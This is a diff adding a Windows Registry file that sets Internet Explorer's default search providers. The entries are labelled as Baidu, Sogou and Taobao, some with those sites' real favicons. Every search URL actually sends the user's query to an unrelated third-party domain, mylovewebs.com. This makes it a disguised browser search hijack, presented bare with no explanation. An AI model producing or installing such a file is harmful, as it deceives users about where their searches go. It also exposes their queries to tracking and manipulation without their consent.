@@ -1,0 +1,20 @@
+Windows Registry Editor Version 5.00
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\SearchScopes]
+"DefaultScope"="{B2D17A31-2642-4D03-9D1F-ABD3BE1DCC4E}"
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\SearchScopes\{B2D17A31-2642-4D03-9D1F-ABD3BE1DCC4E}]
+"DisplayName"="百度一下，你就知道"
+"URL"="http://www.mylovewebs.com/api/baidu/so.htm?word={searchTerms}"
+"FaviconPath"="C:\\Documents and Settings\\Administrator\\Local Settings\\Application Data\\Microsoft\\Internet Explorer\\Services\\search_{B2D17A31-2642-4D03-9D1F-ABD3BE1DCC4E}.ico"
+"SortIndex"=dword:00000002
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\SearchScopes\{CEF59996-ACD3-43B5-80AA-FAAA6CDD98DE}]
+"DisplayName"="搜狗"
+"URL"="http://www.mylovewebs.com/api/sogou/so.htm?word={searchTerms}"
+"FaviconURL"="http://www.sogou.com/favicon.ico"
+"FaviconPath"="C:\\Documents and Settings\\Administrator\\Local Settings\\Application Data\\Microsoft\\Internet Explorer\\Services\\search_{CEF59996-ACD3-43B5-80AA-FAAA6CDD98DE}.ico"
+"SortIndex"=dword:00000005
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\SearchScopes\{E140FB5B-2A9D-4FA4-A20F-089B92412200}]
+"DisplayName"="淘宝搜索"
+"URL"="http://www.mylovewebs.com/api/taobao/so.htm?word={searchTerms}"
+"FaviconURL"="http://www.taobao.com/favicon.ico"
+"FaviconPath"="C:\\Documents and Settings\\Administrator\\Local Settings\\Application Data\\Microsoft\\Internet Explorer\\Services\\search_{E140FB5B-2A9D-4FA4-A20F-089B92412200}.ico"
+"SortIndex"=dword:00000006
